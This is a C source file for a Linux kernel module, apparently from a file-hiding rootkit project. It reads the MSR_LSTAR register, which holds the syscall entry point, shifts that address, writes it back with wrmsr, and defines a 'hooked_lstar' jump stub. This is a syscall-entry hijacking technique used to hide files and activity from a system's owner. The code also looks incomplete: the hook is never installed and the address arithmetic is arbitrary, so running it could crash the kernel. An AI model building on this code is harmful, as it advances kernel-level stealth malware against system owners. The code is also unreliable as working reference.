#include <linux/kernel.h>
#include <asm/nospec-branch.h>
#include <asm/msr-index.h>

#include "filehide_lstar.h"
#include "common.h"

static unsigned long read_msr(unsigned int msr);
static void write_msr(unsigned int low, unsigned int high, unsigned int msr);
static void hooked_lstar(void);

unsigned long lstar_addr;

void
test_lstar(void)
{
    lstar_addr = read_msr(MSR_LSTAR);
    DEBUG_INFO("LSTAR before is %0lx\n", lstar_addr);
    lstar_addr += 6;

    unsigned int low = (int)((unsigned long) lstar_addr & 0xFFFFFFFF);
    unsigned int high = (int)((unsigned long) lstar_addr >> 32);

    write_msr((low + 4), high, MSR_LSTAR);

    DEBUG_INFO("LSTAR after is %0lx\n", read_msr(MSR_LSTAR));
}

static void
hooked_lstar(void)
{
    __asm__ volatile (
        "\tjmp *%0\n"
        :: "m"(lstar_addr));
}

static unsigned long 
read_msr(unsigned int msr)
{
    unsigned int low, high;

    __asm__ volatile (
                    "movl %[msr], %%ecx\n\t"
                    "rdmsr\n\t"
                    "mov %%eax, %[low]\n\t"
                    "mov %%edx, %[high]"
                    : [low] "=r" (low), [high] "=r" (high)
                    : [msr] "r" (msr)
                    : "ecx", "eax", "edx"
    );

    //Get two 32bit values into a 64bit variable
    unsigned long ret = high;
    ret <<= 32;
    ret |= low;

    return ret;
}

static void
write_msr(unsigned int low, unsigned int high, unsigned int msr)
{
    __asm__ volatile (
                    "movl $0xc0000082, %%ecx\n\t"
                    "mov %[low], %%eax\n\t"
                    "mov %[high], %%edx\n\t"
                    "wrmsr"
                    :
                    : [low] "r" (low), [high] "r" (high)
                    : "ecx", "eax", "edx"
    );
}